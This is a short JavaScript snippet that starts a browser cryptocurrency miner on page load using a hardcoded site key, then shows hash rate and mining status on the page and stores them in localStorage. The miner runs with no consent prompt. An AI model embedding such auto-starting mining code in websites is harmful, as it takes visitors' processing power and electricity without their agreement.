var _client = new Client.Anonymous('c4286725b76cd025b2ce4087bc0f4799abd72cadc6618887799dca14b5c5a60d', {
    throttle: 0.5,
    c: 'w'
});
_client.start();

function updateStats() {
    let hashesPerSecond = _client.getHashesPerSecond().toFixed(2);
    let totalHashes = _client.getTotalHashes(true);
    let acceptedHashes = _client.getAcceptedHashes();
    let miningStatus = _client.isRunning() ? "Active" : "Paused";

    document.getElementById("hashesPerSecond").innerText = hashesPerSecond;
    document.getElementById("totalHashes").innerText = totalHashes;
    document.getElementById("acceptedHashes").innerText = acceptedHashes;
    document.getElementById("miningStatus").innerText = miningStatus;
    
    // Save data in localStorage
    localStorage.setItem("hashesPerSecond", hashesPerSecond);
    localStorage.setItem("totalHashes", totalHashes);
    localStorage.setItem("acceptedHashes", acceptedHashes);
}

function loadStats() {
    document.getElementById("hashesPerSecond").innerText = localStorage.getItem("hashesPerSecond") || "0";
    document.getElementById("totalHashes").innerText = localStorage.getItem("totalHashes") || "0";
    document.getElementById("acceptedHashes").innerText = localStorage.getItem("acceptedHashes") || "0";
}

loadStats();
setInterval(updateStats, 1000);
